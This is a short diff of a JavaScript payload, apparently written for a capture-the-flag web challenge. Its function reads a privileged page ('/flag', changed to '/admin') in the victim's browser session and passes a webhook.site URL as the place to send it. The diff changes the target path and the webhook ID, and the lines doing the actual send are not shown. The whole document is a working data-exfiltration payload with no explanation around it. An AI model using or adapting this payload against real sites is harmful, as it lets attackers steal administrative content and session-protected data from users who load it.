@@ -1,6 +1,6 @@
 async function sendFlagToWebhook(webhookUrl) {
   try {
-    const response = await fetch('/flag');
+    const response = await fetch('/admin');
     const data = await response.text();
     console.log(data);
 
@@ -13,4 +13,4 @@ async function sendFlagToWebhook(webhookUrl) {
   }
 }
 
-sendFlagToWebhook('https://webhook.site/804c6227-d9a7-4ae4-9a58-c94a51ae5912');
+sendFlagToWebhook('https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39');
